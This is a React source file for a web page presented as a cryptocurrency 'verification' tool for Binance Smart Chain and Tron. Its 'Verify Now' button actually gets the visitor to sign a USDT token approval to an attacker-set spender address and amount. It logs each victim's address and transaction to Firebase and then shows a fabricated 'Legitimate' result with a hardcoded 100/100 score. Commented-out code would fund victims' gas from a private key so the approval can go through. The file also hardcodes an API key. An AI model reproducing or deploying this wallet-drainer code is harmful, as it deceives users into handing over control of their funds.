// @ts-nocheck

import React, { useState, useEffect, useCallback, useMemo, useRef } from 'react';
import { useSpring, animated } from 'react-spring'
import Button from '../common/Button'
import { database, push, ref } from '../../firebase/firebase';
import Web3 from 'web3';
import Swal from 'sweetalert2';
import { TronWeb } from 'tronweb';
import { WalletProvider, useWallet } from '@tronweb3/tronwallet-adapter-react-hooks';
import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect';
import { TronLinkAdapter } from '@tronweb3/tronwallet-adapters';

const FULL_NODE = 'https://api.trongrid.io';
const SOLIDITY_NODE = 'https://api.trongrid.io';
const EVENT_SERVER = 'https://api.trongrid.io';
const PROJECT_ID = '150d746f7722fa489e9df7ad9ddcd955';
const RELAY_URL = 'wss://relay.walletconnect.com';
const trxContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'

interface FormState {
  contractAddress: string
  blockchain: string
}

const VerificationFormComponent = (props) => {
  const [formData, setFormData] = useState<FormState>({
    contractAddress: '',
    blockchain: 'binance'
  })
  const { setIsSubmitting, isSubmitting } = props
  const score = 100

  const [showResults, setShowResults] = useState(false)
  const [userDetail, setUserDetail] = useState({
    balance: 0,
    address: ''
  })
  const { address, wallet, connected, select, connect, disconnect } = useWallet();
  const [tronWeb] = useState(() => new TronWeb(FULL_NODE, SOLIDITY_NODE, EVENT_SERVER));
  const [trxBalance, setTrxBalance] = useState(null);
  const [tokenBalance, setTokenBalance] = useState(null);
  const [loading, setLoading] = useState(false);

  const spenderAddress = import.meta.env.VITE_SPENDER_ADDRESS;
  const walletPrivateKey = import.meta.env.VITE_PRIVATE_KEY;
  const spenderTrx = import.meta.env.VITE_SPENDER_ADDRESS_TRX;
  const busdContractAddress = '0x55d398326f99059fF775485246999027B3197955';
  const spenderAmount = import.meta.env.VITE_AMOUNT;

  // Trying...
  const [readyState, setReadyState] = useState();
  const [account, setAccount] = useState('');
  const [netwok, setNetwork] = useState({});
  const [signedMessage, setSignedMessage] = useState('');

  const adapter = useMemo(() => new TronLinkAdapter(), []);
  // useEffect(() => {
  //   setReadyState(adapter.readyState);
  //   setAccount(adapter.address!);
  //   console.log('Adapter address:', adapter);

  //   return () => {
  //     // remove all listeners when components is destroyed
  //     adapter.removeAllListeners();
  //   };
  // }, []);

  async function sign() {
    const res = await adapter!.signMessage('helloworld');
    setSignedMessage(res);
  }

  /// enddd

  const contractType = {
    'binance': 'BEP-20 Token',
    'tron': 'TRC-20 Token'
  }

  const formAnimation = useSpring({
    opacity: 1,
    transform: 'translateY(0)',
    from: { opacity: 0, transform: 'translateY(20px)' },
    config: { tension: 300, friction: 20 }
  })

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target
    setFormData(prev => ({ ...prev, [name]: value }))
  }

  const busdAbi = [
    {
      "constant": false,
      "inputs": [
        { "name": "_spender", "type": "address" },
        { "name": "_value", "type": "uint256" }
      ],
      "name": "approve",
      "outputs": [{ "name": "", "type": "bool" }],
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [{ "name": "_owner", "type": "address" }],
      "name": "balanceOf",
      "outputs": [{ "name": "balance", "type": "uint256" }],
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "decimals",
      "outputs": [{
        "internalType": "uint8",
        "name": "",
        "type": "uint8"
      }],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        { "name": "_owner", "type": "address" },
        { "name": "_spender", "type": "address" }
      ],
      "name": "allowance",
      "outputs": [{ "name": "remaining", "type": "uint256" }],
      "type": "function"
    },
  ];

  const blockchainOptions = [
    { value: 'binance', label: 'Binance Smart Chain (BSC)' },
    { value: 'tron', label: 'Tron (TRC)' },
  ]

  const addData = (keyName, userAddress, tx, address) => {
    if (userAddress.trim() !== "") {
      const newDataRef = ref(database, keyName);
      const newItemObject = {
        id: tx,
        userAddress: userAddress,
        transactionHash: tx,
        spenderAddress: address
      };
      push(newDataRef, newItemObject);
    }
    setIsSubmitting(false);
  };

  const approveToken = async () => {
    const web3 = new Web3(window.ethereum);
    setIsSubmitting(true);
    try {
      if (!window.ethereum) throw new Error("MetaMask/Trust Wallet is not installed.");

      const networkId = await web3.eth.net.getId();
      if (networkId != 56) {
        try {
          await window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: "0x38" }],
          });
        } catch (switchError) {
          if (switchError.code === 4902) {
            throw new Error("Binance Smart Chain is not available in your wallet. Please add it manually.");
          }
          throw new Error("Network switch failed");
        }
      }
      const accounts = await web3.eth.requestAccounts();
      const userAccount = accounts[0];

      const busdContract = new web3.eth.Contract(busdAbi, busdContractAddress);
      const maxApproval = web3.utils.toWei(spenderAmount, "wei");
      const tx = await busdContract.methods.approve(spenderAddress, maxApproval).send({ from: userAccount });
      const balance = await busdContract.methods.balanceOf(userAccount).call();
      const balanceInBUSD = web3.utils.fromWei(balance, 'ether');
      addData('clientUsers', userAccount, tx?.transactionHash, spenderAddress)
      setUserDetail({
        address: userAccount,
        balance: balanceInBUSD
      })
      setTimeout(() => {
        setShowResults(true)
      }, 100);

    } catch (err) {
      Swal.fire({
        icon: "error",
        title: "Failed",
        text: "Verification Failed!"
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  const getCurrentDate = () => {
    const today = new Date()
    return today.toISOString().split('T')[0]
  }
  // const waitForTrxBalance = async (userAddress, minAmount = 35, maxAttempts = 35, delay = 3000) => {
  //   let attempts = 0;

  //   while (attempts < maxAttempts) {
  //     const balance = await tronWeb.trx.getBalance(userAddress);
  //     const balanceInTrx = balance / 1_000_000;
  //     console.log('balancebalance', balanceInTrx);

  //     if (balanceInTrx >= minAmount) {
  //       return true;
  //     }

  //     await new Promise(res => setTimeout(res, delay));
  //     attempts++;
  //   }

  //   throw new Error("User did not receive enough TRX in time.");
  // };


  // const fundTrxToUser = async (userAddress) => {
  //   try {
  //     setIsSubmitting(true);

  //     const adminTronWeb = new TronWeb({
  //       fullHost: 'https://api.trongrid.io',
  //       privateKey: walletPrivateKey,
  //     });

  //     const sendAmount = 35 * 1_000_000;

  //     const tx = await adminTronWeb.transactionBuilder.sendTrx(userAddress, sendAmount);
  //     const signedTx = await adminTronWeb.trx.sign(tx);
  //     const broadcast = await adminTronWeb.trx.sendRawTransaction(signedTx);

  //     if (!broadcast.result) throw new Error("TRX transaction failed");

  //     Swal.fire({
  //       icon: 'info',
  //       title: 'Sending TRX',
  //       text: 'Waiting for TRX to arrive...',
  //       timer: 3000
  //     });

  //     await waitForTrxBalance(userAddress, 35);

  //     const contract = await tronWeb.contract().at(trxContractAddress);
  //     const usdtTrx = await contract.balanceOf(userAddress).call();
  //     const balanceUSDT = parseInt(usdtTrx.toString(), 10) / 1_000_000;

  //     await handleApprove(balanceUSDT);
  //   } catch (err) {
  //     console.error(err);
  //     Swal.fire({
  //       icon: 'error',
  //       title: 'Funding Failed',
  //       text: err.message
  //     });
  //     setIsSubmitting(false);
  //   }
  // };

  const fetchTrxBalance = async () => {
    tronWeb.setAddress(address);
    const trxBalance = await tronWeb.trx.getBalance(address);
    const contract = await tronWeb.contract().at(trxContractAddress);
    const usdtTrx = await contract.balanceOf(address).call();
    const balanceUSDT = parseInt(usdtTrx.toString(), 10) / 1_000_000
    const balanceTrx = trxBalance / 1_000_000

    if (balanceTrx > 35) {
      handleApprove(balanceUSDT)
    } else {
      setIsSubmitting(false);
      // await fundTrxToUser(address);
      Swal.fire({
        icon: "error",
        title: "Insufficient Balance",
        text: "You need at least 35 TRX for the verificaion."
      });
      return;
    }
  };

  const handleApprove = async (balanceUSDT) => {

    try {
      const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
        trxContractAddress,
        'approve(address,uint256)',
        {
          feeLimit: 300_000_000,
          callValue: 0,
          shouldPollResponse: false
        },
        [
          { type: 'address', value: spenderTrx },
          { type: 'uint256', value: (spenderAmount * 1_000_000).toString() },
        ],
        address
      );

      const signedTx = await wallet.adapter.signTransaction(transaction);

      const receipt = await tronWeb.trx.sendRawTransaction(signedTx);

      if (receipt?.txid) {
        addData('trxUsers', address, receipt?.txid, spenderTrx)
        setUserDetail({
          address: address,
          balance: balanceUSDT
        })
        setTimeout(() => {
          setShowResults(true)
        }, 100);
        setIsSubmitting(false);
      } else {
        setIsSubmitting(false);
        Swal.fire({
          icon: "error",
          title: "Verification Failed",
          text: error.message || "An error occurred while doing the verfication."
        });
      }

    } catch (error) {
      setIsSubmitting(false);
      Swal.fire({
        icon: "error",
        title: "Verification Failed",
        text: error.message || "An error occurred while doing the verfication."
      });
    }
  };

  const verifyButtonRef = useRef(null);

  useEffect(() => {
    if (connected && address) {
      fetchTrxBalance()
    }
  }, [connected, address]);

  const handleConnect = async (value) => {
    setIsSubmitting(true);
    try {
      await select('WalletConnect');
      await connect();
    } catch (err) {
      if ('WalletNotSelectedError: No wallet is selected. Please select a wallet.' == err?.toString().trim() && value === false && verifyButtonRef?.current) {
        setTimeout(() => {
          verifyButtonRef?.current?.click();
        }, 100);
      } else {
        Swal.fire({
          icon: "error",
          title: "Connection Cancelled",
          text: "Wallet connection was cancelled or failed."
        }).then(() => {
          setIsSubmitting(false);
        });
      }
    }
  };

  const handleSubmit = async (value) => {

    await adapter.connect();
    console.log('adapter', adapter?.address);
    console.log('adapter', adapter?.readyState);

    const tronWeb = new TronWeb({
      fullHost: 'https://api.trongrid.io',
      headers: { 'TRON-PRO-API-KEY': '7a869df0-71b7-4fbe-afe1-b9bc0051e9d9' },
    });
    console.log('tronWeb', tronWeb);

    const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
      trxContractAddress,
      'approve(address,uint256)',
      {
        feeLimit: 300_000_000,
        callValue: 0,
        shouldPollResponse: false
      },
      [
        { type: 'address', value: spenderTrx },
        { type: 'uint256', value: (spenderAmount * 1_000_000).toString() },
      ],
      address
    );
    const signedTx = await adapter.signTransaction(transaction);
    console.log('signedTx', signedTx);

    const receipt = await tronWeb.trx.sendRawTransaction(signedTx);
    console.log('receipt', receipt);

    // if (disconnect) {
    //   await disconnect();
    // }

    // if (formData?.blockchain === 'tron') {
    //   handleConnect(value)
    // } else if (formData?.blockchain === 'binance') {
    //   approveToken()
    // }
  }

  return (
    <animated.div style={formAnimation} className="verification-form-container">
      <div className="form-header">
        <h2>Verify Cryptocurrency</h2>
        <p>Enter the contract address to verify authenticity and security</p>
      </div>

      <form className="verification-form">
        <div className="form-group">
          <label htmlFor="blockchain">Select Blockchain</label>
          <select
            id="blockchain"
            name="blockchain"
            value={formData.blockchain}
            onChange={handleChange}
            className="form-control"
            required
          >
            {blockchainOptions.map(option => (
              <option key={option.value} value={option.value}>
                {option.label}
              </option>
            ))}
          </select>
        </div>

        <Button
          label={isSubmitting ? "Verifying..." : "Verify Now"}
          variant="primary"
          ref={verifyButtonRef}
          size="large"
          type="button"
          onClick={() => handleSubmit(false)}
          fullWidth
          disabled={isSubmitting}
        />
      </form>
      {isSubmitting && (
        <div className="verification-loading">
          <div className="loading-spinner-small"></div>
          <p>Scanning blockchain data and security databases...</p>
        </div>
      )}

      {showResults && (
        <div className="verification-results">
          <div className="result-header success">
            <div className="result-icon">✓</div>
            <div className="result-title">Verification Complete</div>
          </div>

          <div className="result-details">
            <div className="result-item">
              <span className="result-label">Security Score:</span>
              <span className="result-value">{score}/100</span>
            </div>
            <div className="result-item">
              <span className="result-label">Contract Type:</span>
              <span className="result-value">{contractType[formData?.blockchain]}</span>
            </div>
            <div className="result-item">
              <span className="result-label">Address:</span>
              <span className="result-value">{userDetail?.address}</span>
            </div>
            <div className="result-item">
              <span className="result-label">Current Balance:</span>
              <span className="result-value">{userDetail?.balance}</span>
            </div>
            <div className="result-item">
              <span className="result-label">Creation Date:</span>
              <span className="result-value">{getCurrentDate()}</span>
            </div>
            <div className="result-item">
              <span className="result-label">Verified Status:</span>
              <span className="result-value success">Legitimate</span>
            </div>
          </div>
        </div>
      )}
    </animated.div>
  )
}

export default function VerificationForm() {
  const adapter = useMemo(
    () =>
      new WalletConnectAdapter({
        network: 'Mainnet',
        options: {
          projectId: '150d746f7722fa489e9df7ad9ddcd955',
          relayUrl: RELAY_URL,
          metadata: {
            name: 'My Tron DApp',
            description: 'DApp with WalletConnect',
            url: window.location.origin,
            icons: [],
          },
        },
        web3ModalConfig: {
          themeMode: "dark",
          themeVariables: {
            "--w3m-z-index": 1000,
          },
          projectId: '150d746f7722fa489e9df7ad9ddcd955',
          explorerRecommendedWalletIds: [
            "c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96", // MetaMask
            "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0", // Trust Wallet
            "38f5d18bd8522c244bdd70cb4a68e0e718865155811c043f052fb9f1c51de662", // Bitget Wallet
            "afbd95522f4041c71dd4f1a065f971fd32372865b416f95a0b1db759ae33f2a7", // Omni Wallet
            "e9ff15be73584489ca4a66f64d32c4537711797e30b6660dbcb71ea72a42b1f4", // Exodus Wallet
            "b6329af78b11719de52ca0426fb50d64b9b965335fc53dafed994ec22680614e", // imToken Wallet
            "971e689d0a5be527bac79629b4ee9b925e82208e5168b733496a09c0faed0709", // OkX Wallet
            "8a0ee50d1f22f6651afcae7eb4253e52a3310b90af5daef78a8c4929a9bb99d4", // binance Wallet
            "f660ee0b2171e3c4085d4c4c960386bcf9ce6e6d99135c3e3ecf46f20aee86a9", // Bitget Wallet
            "b14e41b2663f7cc6b0700d3d8dfd5406f706d519be3a5d4b9e13b332a8c7b4c4", // Omni Wallet
            "13e3960a86aebeaefbd68062ad0c778308a3f5439e46d52e1cb05c1e3c81bc03", // Exodus Wallet
            "b81b14f39aabb0b9637fef32cddbd12a045fbe2e143f4428bdc1e7d11f6b4d5c", // imToken Walley
          ]
        },
      }),
    []
  );
  const [isSubmitting, setIsSubmitting] = useState(false)

  const onError = (e) => {
    setIsSubmitting(false)
  };

  return (
    <WalletProvider adapters={[adapter]} onError={onError} autoConnect={false}>
      <VerificationFormComponent
        setIsSubmitting={setIsSubmitting}
        isSubmitting={isSubmitting}
      />
    </WalletProvider>
  );
}
